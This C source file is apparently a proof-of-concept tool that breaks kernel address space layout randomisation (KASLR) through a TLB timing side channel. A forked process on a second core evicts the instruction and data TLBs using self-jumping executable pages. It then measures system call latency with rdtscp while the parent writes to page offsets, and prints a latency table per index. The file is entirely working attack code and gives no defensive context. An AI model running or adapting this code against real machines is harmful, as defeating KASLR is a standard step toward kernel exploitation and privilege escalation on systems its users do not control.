#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "utils.h"

static int CORE1, CORE2;

typedef struct pctrl_t {
    volatile u32 idx, syscall;
    volatile bool start, ready, warmpup;
} pctrl_t;

#define TEMPLATE_SIZE 16
void kaslr() {
    double *latencies = (double *)mmap_shared(NULL, sizeof(double) * INDEX_COUNT);
    if (!latencies)
        return;
    memset(latencies, 0, sizeof(double) * INDEX_COUNT);

    volatile pctrl_t *ctrl = (pctrl_t *)mmap_shared(NULL, sizeof(pctrl_t));
    if (!ctrl)
        return;

    ctrl->idx = 0;
    ctrl->start = false;
    ctrl->ready = false;

    int pid = fork();
    if (pid == 0) {
        set_affinity_priority(CORE2, 0);

        const u16 addr_index = 3;
        const u32 itlb_size = 72; // greater than the actual size to ensure a complete eviction
        const u32 stlb_size = 2048;
        u32 code_base_addr = 0x6000000ull;
        // the template is
        // movq $0x0000000, %rax
        // jmp *%rax
        u8 template[TEMPLATE_SIZE] = {0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00, 0xff,
                                      0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xc3};

        // allocate 64 code pages
        u8 *code_pages[itlb_size];
        for (u32 i = 0; i < itlb_size; i++) {
            u32 addr = code_base_addr + i * PAGE_SIZE;
            u32 target = addr + PAGE_SIZE;
            u8 *ptr = mmap((void *)(u64)addr, PAGE_SIZE,
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (ptr == MAP_FAILED) {
                return;
            }
            memcpy(ptr, template, TEMPLATE_SIZE);
            memcpy(&ptr[addr_index], &target, sizeof(u32));
            if (i == itlb_size - 1) {
                // set the last page as "ret"
                memset(ptr, 0x90, TEMPLATE_SIZE);
                ptr[0] = 0xc3;
            }
        }

        u8 *data_pages = mmap_private(NULL, stlb_size * PAGE_SIZE);
        if (!data_pages) {
            return;
        }

        ctrl->ready = true;
        while (true) {
            u64 tstart, tend, tdiff;
            u32 sig, syscall_id;

            while (!ctrl->start);

            syscall_id = ctrl->syscall;

#ifdef NOPTI
            // flush itlb
            asm volatile("pushq %%rax\n"
                         "movq %0, %%rax\n"
                         "call *%%rax\n"
                         "pop %%rax" ::"r"((u64)code_base_addr)
                         : "rax");
#endif // NOPTI

            // flush stlb
            for (u32 i = 0; i < stlb_size; i++) {
                _maccess(&data_pages[i * PAGE_SIZE]);
            }
            syscall(500); // warmup un-related pages

            tstart = _rdtscp(&sig);
            syscall(syscall_id);
            tend = _rdtscp(&sig);
            tdiff = tend - tstart;

            if (!ctrl->warmpup) {
                latencies[ctrl->idx] += tdiff;
            }
            ctrl->start = false;
        }
    } else if (pid < 0) {
        _error("Cannot fork!\n");
    }

    set_affinity_priority(CORE1, 0);
    u8 *normal_page = mmap_private(NULL, PAGE_SIZE);
    if (!normal_page) goto mmap_fail;
    memset(normal_page, 0, PAGE_SIZE);

    while (!ctrl->ready);

#ifdef NOPTI
    const u32 measures = 100;
    const u32 warmup = 10;
#else
    const u32 measures = 10;
    const u32 warmup = 3;
#endif

    for (u32 idx = 0; idx < INDEX_COUNT; idx++) {
        u32 offset = idx << 3;
        ctrl->idx = idx;
        ctrl->syscall = SYS_time;
        for (u32 i = 0; i < measures + warmup; i++) {
            ctrl->warmpup = i < warmup;
            ctrl->start = true;
            while (ctrl->start) {
                _mwrite(&normal_page[offset], 0xff);
                _mwrite(&normal_page[offset], 0xff);
                _mwrite(&normal_page[offset], 0xff);
            }
        }
    }

    for (u32 i = 0; i < INDEX_COUNT; i++) {
        printf("%#x\t%.2f\n", i, latencies[i] / measures);
    }

    munmap(normal_page, PAGE_SIZE * 2);
mmap_fail:
    kill(pid, SIGKILL);
    return;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        return -1;
    }

    CORE1 = atoi(argv[2]);
    CORE2 = atoi(argv[3]);

    if (strcmp(argv[1], "kaslr") == 0) {
        kaslr();
    } else {
        fprintf(stderr, "Unknown option %s or insufficient arguments\n", argv[1]);
        return 1;
    }
}
